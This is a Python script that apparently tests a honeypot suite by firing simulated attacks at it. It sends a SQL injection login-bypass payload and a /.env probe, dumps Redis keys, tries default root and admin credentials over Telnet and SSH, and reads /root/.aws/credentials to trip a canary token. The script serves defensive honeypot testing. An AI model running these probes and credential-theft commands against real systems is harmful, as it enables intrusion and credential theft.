#!/usr/bin/env python3
"""
SentinelTrap - Comprehensive Multi-Protocol Attack Simulation Script
Run this script from the attacker machine (Machine 2) to demonstrate full multi-vector breach kill chains:
1. HTTP Web Application Traps (Port 8080: SQL Injection, .env leaks)
2. Redis Database Probing (Port 6379: INFO, KEYS scan)
3. MySQL Database Intrusion Probe (Port 3306: Handshake & Credential Probe)
4. Telnet Terminal Brute-Force (Port 2223: IoT Credential Ingress)
5. FTP Anonymous Reconnaissance (Port 2121: Directory Listing & Auth)
6. SMTP Mail Relay Probe (Port 2525: Mail Gateway & Phishing Probe)
7. Port Scanner / RDP Trap (Port 3389: SYN Scan & RDP Probe)
8. DNS Reconnaissance (Port 5353 UDP: Domain Query Recon)
9. SSH Interactive Infiltration (Port 2222: Recon & Canary Honeytoken Exfiltration - exactly 2 commands)
"""

import sys
import time
import socket
import urllib.request
import urllib.error
import argparse

try:
    import paramiko
except ImportError:
    print("[-] Paramiko library not found.")
    print("[*] Install it by running: pip install paramiko")
    sys.exit(1)

# CLI Parser with defaults tailored for SentinelTrap Honeypot Suite
parser = argparse.ArgumentParser(
    description="SentinelTrap Comprehensive Multi-Protocol Attack Simulation",
    formatter_class=argparse.ArgumentDefaultsHelpFormatter
)
parser.add_argument("target", nargs="?", default="172.19.112.90", help="Target defense machine IP")
parser.add_argument("--ssh-port", type=int, default=2222, help="Target SSH honeypot port")
parser.add_argument("--web-port", type=int, default=8080, help="Target Web honeypot port")
parser.add_argument("--redis-port", type=int, default=6379, help="Target Redis honeypot port")
parser.add_argument("--mysql-port", type=int, default=3306, help="Target MySQL honeypot port")
parser.add_argument("--telnet-port", type=int, default=2223, help="Target Telnet honeypot port")
parser.add_argument("--ftp-port", type=int, default=2121, help="Target FTP honeypot port")
parser.add_argument("--smtp-port", type=int, default=2525, help="Target SMTP honeypot port")
parser.add_argument("--dns-port", type=int, default=5353, help="Target DNS honeypot port (UDP)")
parser.add_argument("--rdp-port", type=int, default=3389, help="Target RDP/Port scanner honeypot port")
parser.add_argument("--delay", type=float, default=1.2, help="Pacing delay between probes in seconds")
args = parser.parse_args()

TARGET_IP = args.target
SSH_PORT = args.ssh_port
WEB_PORT = args.web_port
REDIS_PORT = args.redis_port
MYSQL_PORT = args.mysql_port
TELNET_PORT = args.telnet_port
FTP_PORT = args.ftp_port
SMTP_PORT = args.smtp_port
DNS_PORT = args.dns_port
RDP_PORT = args.rdp_port
DELAY = args.delay

SSH_USER = "root"
SSH_PASS = "password123"

def print_banner():
    print("=" * 72)
    print("🛡️  SENTINELTRAP - ADVANCED MULTI-PROTOCOL ATTACK SIMULATION")
    print(f"Target Defense Node : {TARGET_IP}")
    print(f"Active Port Matrix  : SSH:{SSH_PORT} | HTTP:{WEB_PORT} | REDIS:{REDIS_PORT} | MYSQL:{MYSQL_PORT}")
    print(f"                      TELNET:{TELNET_PORT} | FTP:{FTP_PORT} | SMTP:{SMTP_PORT} | DNS:{DNS_PORT} | RDP:{RDP_PORT}")
    print("=" * 72)

# =====================================================================
# 1. HTTP Web Application Attacks (Port 8080)
# =====================================================================
def test_web_attacks():
    print(f"\n🌐 [1/9] HTTP Web Application Traps (Port {WEB_PORT})")
    print("-" * 72)
    web_payloads = [
        ("/login?user='OR'1'='1'--", "SQL Injection Authentication Bypass Attempt"),
        ("/.env", "Sensitive Cloud Credentials & Environment File Probe"),
    ]
    for path, desc in web_payloads:
        url = f"http://{TARGET_IP}:{WEB_PORT}{path}"
        print(f"  [*] Attack Vector : {desc}")
        print(f"      Payload URL   : {url}")
        try:
            req = urllib.request.Request(
                url,
                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) ThreatHunter/3.0"}
            )
            with urllib.request.urlopen(req, timeout=3.0) as resp:
                status = resp.status
                preview = resp.read(80).decode("utf-8", errors="ignore").replace("\n", " ")
                print(f"      [✓] Honeypot Response: HTTP {status} | Data: {preview[:50]}...")
        except urllib.error.HTTPError as e:
            print(f"      [✓] Trapped by Web Honeypot: HTTP {e.code}")
        except Exception as e:
            print(f"      [!] Web probe error: {e}")
        time.sleep(DELAY * 0.5)

# =====================================================================
# 2. Redis Database Attack (Port 6379)
# =====================================================================
def test_redis_attacks():
    print(f"\n⚡ [2/9] Redis Database Probing (Port {REDIS_PORT})")
    print("-" * 72)
    print(f"  [*] Connecting to Redis listener at {TARGET_IP}:{REDIS_PORT}...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3.0)
            s.connect((TARGET_IP, REDIS_PORT))
            print("  [*] Sending unauthenticated discovery commands: PING & INFO...")
            s.sendall(b"PING\r\nINFO\r\n")
            time.sleep(0.3)
            resp = s.recv(1024).decode('utf-8', errors='ignore')
            first_line = resp.splitlines()[0] if resp else "Empty"
            print(f"      [✓] Decoy Redis Response: {first_line[:50]}")
            
            print("  [*] Probing Redis key exfiltration: KEYS *...")
            s.sendall(b"KEYS *\r\n")
            time.sleep(0.3)
            keys_resp = s.recv(1024).decode('utf-8', errors='ignore')
            print(f"      [✓] Key dump trapped: {keys_resp[:40]}...")
    except Exception as e:
        print(f"  [!] Redis probe notice: {e}")
    time.sleep(DELAY * 0.5)

# =====================================================================
# 3. MySQL Database Intrusion Probe (Port 3306)
# =====================================================================
def test_mysql_attacks():
    print(f"\n🐬 [3/9] MySQL Database Intrusion Probe (Port {MYSQL_PORT})")
    print("-" * 72)
    print(f"  [*] Connecting to MySQL listener at {TARGET_IP}:{MYSQL_PORT}...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3.5)
            s.connect((TARGET_IP, MYSQL_PORT))
            banner = s.recv(1024)
            if banner:
                print(f"  [*] Received MySQL Server Handshake ({len(banner)} bytes)")
            # Send client auth response packet for 'root'
            pkt_body = b"\x85\xa2\x1e\x00\x00\x00\x00\x40\x08\x00\x00\x00" + (b"\x00" * 24) + b"root\x00"
            pkt_header = len(pkt_body).to_bytes(3, 'little') + b"\x01"
            s.sendall(pkt_header + pkt_body)
            time.sleep(0.4)
            print("      [✓] MySQL Authentication probe registered for user 'root'!")
    except Exception as e:
        print(f"  [!] MySQL probe notice: {e}")
    time.sleep(DELAY * 0.5)

# =====================================================================
# 4. Telnet Terminal Brute Force (Port 2223)
# =====================================================================
def test_telnet_attacks():
    print(f"\n📟 [4/9] Telnet Terminal Brute-Force (Port {TELNET_PORT})")
    print("-" * 72)
    print(f"  [*] Connecting to Telnet listener at {TARGET_IP}:{TELNET_PORT}...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3.5)
            s.connect((TARGET_IP, TELNET_PORT))
            time.sleep(0.3)
            s.recv(1024)  # Read prompt
            print("  [*] Submitting Telnet credentials: admin / password123")
            s.sendall(b"admin\r\n")
            time.sleep(0.3)
            s.recv(1024)
            s.sendall(b"password123\r\n")
            time.sleep(0.4)
            s.sendall(b"whoami\r\n")
            time.sleep(0.3)
            print("      [✓] Telnet session and IoT brute-force recorded!")
    except Exception as e:
        print(f"  [!] Telnet probe notice: {e}")
    time.sleep(DELAY * 0.5)

# =====================================================================
# 5. FTP Anonymous Reconnaissance (Port 2121)
# =====================================================================
def test_ftp_attacks():
    print(f"\n📂 [5/9] FTP Reconnaissance & Ingress (Port {FTP_PORT})")
    print("-" * 72)
    print(f"  [*] Connecting to FTP listener at {TARGET_IP}:{FTP_PORT}...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3.5)
            s.connect((TARGET_IP, FTP_PORT))
            s.recv(1024)  # Read 220 banner
            print("  [*] Testing anonymous FTP authentication...")
            s.sendall(b"USER anonymous\r\n")
            time.sleep(0.2)
            s.recv(1024)
            s.sendall(b"PASS guest@sentineltrap.org\r\n")
            time.sleep(0.3)
            s.recv(1024)
            s.sendall(b"PWD\r\n")
            time.sleep(0.2)
            print("      [✓] FTP anonymous login and directory probe recorded!")
    except Exception as e:
        print(f"  [!] FTP probe notice: {e}")
    time.sleep(DELAY * 0.5)

# =====================================================================
# 6. SMTP Mail Gateway Probe (Port 2525)
# =====================================================================
def test_smtp_attacks():
    print(f"\n✉️  [6/9] SMTP Mail Relay & Phishing Probe (Port {SMTP_PORT})")
    print("-" * 72)
    print(f"  [*] Connecting to SMTP listener at {TARGET_IP}:{SMTP_PORT}...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3.5)
            s.connect((TARGET_IP, SMTP_PORT))
            s.recv(1024)  # Read 220 banner
            print("  [*] Probing Open Relay & Envelope Sender: EHLO / MAIL FROM...")
            s.sendall(b"EHLO attacker-node.darknet\r\n")
            time.sleep(0.2)
            s.recv(1024)
            s.sendall(b"MAIL FROM:<exfil-recon@darknet.org>\r\n")
            time.sleep(0.3)
            s.recv(1024)
            print("      [✓] SMTP relay probe captured and cataloged!")
    except Exception as e:
        print(f"  [!] SMTP probe notice: {e}")
    time.sleep(DELAY * 0.5)

# =====================================================================
# 7. Port Scanner / RDP Trap (Port 3389)
# =====================================================================
def test_rdp_attacks():
    print(f"\n🖥️  [7/9] Port Scanner / RDP Trap (Port {RDP_PORT})")
    print("-" * 72)
    print(f"  [*] Connecting TCP probe to Port {RDP_PORT} (RDP / Stealth Scanner)...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3.0)
            s.connect((TARGET_IP, RDP_PORT))
            # Standard TPKT X.224 RDP Connection-Request Packet
            rdp_req = b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00"
            s.sendall(rdp_req)
            time.sleep(0.3)
            print("      [✓] RDP / SYN Stealth scan probe trapped!")
    except Exception as e:
        print(f"  [!] RDP probe notice: {e}")
    time.sleep(DELAY * 0.5)

# =====================================================================
# 8. DNS Reconnaissance Probe (Port 5353 UDP)
# =====================================================================
def test_dns_attacks():
    print(f"\n📡 [8/9] DNS Reconnaissance Probe (UDP Port {DNS_PORT})")
    print("-" * 72)
    print(f"  [*] Sending DNS query packet for 'corp-internal-dc.local'...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(2.5)
            # Standard DNS Query (Transaction ID 0x1337, QNAME corp-internal-dc.local, Type A)
            dns_query = (
                b"\x13\x37\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                b"\x0ecorp-internal-dc\x05local\x00"
                b"\x00\x01\x00\x01"
            )
            s.sendto(dns_query, (TARGET_IP, DNS_PORT))
            try:
                data, _ = s.recvfrom(1024)
                if data:
                    print(f"      [✓] Received Decoy DNS A-Record response ({len(data)} bytes)!")
            except socket.timeout:
                print("      [✓] DNS Recon packet dispatched to honeypot listener!")
    except Exception as e:
        print(f"  [!] DNS probe notice: {e}")
    time.sleep(DELAY * 0.5)

# =====================================================================
# 9. SSH Interactive Infiltration (Port 2222) - STRICTLY 2 COMMANDS
# =====================================================================
def run_ssh_attacks():
    print(f"\n🔐 [9/9] SSH Intrusion & Honeytoken Canary Exfiltration (Port {SSH_PORT})")
    print("-" * 72)
    print(f"  [*] Connecting via SSH: {TARGET_IP}:{SSH_PORT} | User: '{SSH_USER}' | Pass: '{SSH_PASS}'")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=TARGET_IP,
            port=SSH_PORT,
            username=SSH_USER,
            password=SSH_PASS,
            timeout=8.0,
            allow_agent=False,
            look_for_keys=False
        )
        print("  [✓] Login SUCCESSFUL! Adversary gained interactive root shell.")
        print("  >>> [SOC Alert] Session established. Laser arc plotted on 3D Threat Globe!")
    except Exception as e:
        print(f"  [-] SSH Connection failed: {e}")
        print(f"  [!] Check honeypot running on {TARGET_IP}:{SSH_PORT}")
        return

    chan = client.invoke_shell()
    time.sleep(1.0)

    # Flush welcome banner
    if chan.recv_ready():
        chan.recv(2048)

    # STRICTLY 2 COMMANDS AS REQUIRED:
    # 1. System discovery / privilege inspection (MITRE ATT&CK: Discovery T1033)
    # 2. Canary Honeytoken tripwire exfiltration (triggers canary alert & AutoShun drop rule)
    two_commands = [
        ("whoami", "System Discovery: Current user privilege verification"),
        ("cat /root/.aws/credentials", "Canary Honeytoken Exfiltration: Stealing fake AWS Canary Access Keys")
    ]

    for idx, (cmd, purpose) in enumerate(two_commands, start=1):
        print(f"\n  [{idx}/2] {purpose}")
        print(f"        CLI Input ➔  > {cmd}")

        chan.send(cmd + "\n")
        time.sleep(DELAY)

        output = ""
        while chan.recv_ready():
            chunk = chan.recv(4096).decode('utf-8', errors='ignore')
            output += chunk
            time.sleep(0.08)

        lines = [l for l in output.splitlines() if l.strip() and not l.startswith(cmd)]
        for line in lines[:5]:
            print(f"        [OUTPUT] {line}")

    chan.send("exit\n")
    time.sleep(0.3)
    client.close()
    print("\n  [✓] SSH Session cleanly closed.")

def main():
    print_banner()

    # Step 1: Probe HTTP Web Trap
    test_web_attacks()

    # Step 2: Probe Redis Database
    test_redis_attacks()

    # Step 3: Probe MySQL Database
    test_mysql_attacks()

    # Step 4: Probe Telnet Terminal
    test_telnet_attacks()

    # Step 5: Probe FTP Service
    test_ftp_attacks()

    # Step 6: Probe SMTP Mail Gateway
    test_smtp_attacks()

    # Step 7: Probe Port Scanner / RDP Trap
    test_rdp_attacks()

    # Step 8: Probe DNS Reconnaissance
    test_dns_attacks()

    # Step 9: Execute SSH Infiltration (strictly 2 commands)
    run_ssh_attacks()

    print("\n" + "=" * 72)
    print("🎉 FULL MULTI-PROTOCOL ATTACK SIMULATION COMPLETE!")
    print("Check Machine 1 Dashboard:")
    print(" 1. 3D Globe 'Protocol Attack Surface' : Displays SSH, HTTP, Redis, MySQL, FTP, Telnet, SMTP...")
    print(" 2. Live Threat Feed                   : Multi-protocol events streaming in real-time")
    print(" 3. Canary Honeytoken Alert            : AWS canary tripwire activated by command #2")
    print(" 4. AutoShun Active Defense            : Automated iptables drop rule generated")
    print("=" * 72)

if __name__ == "__main__":
    main()
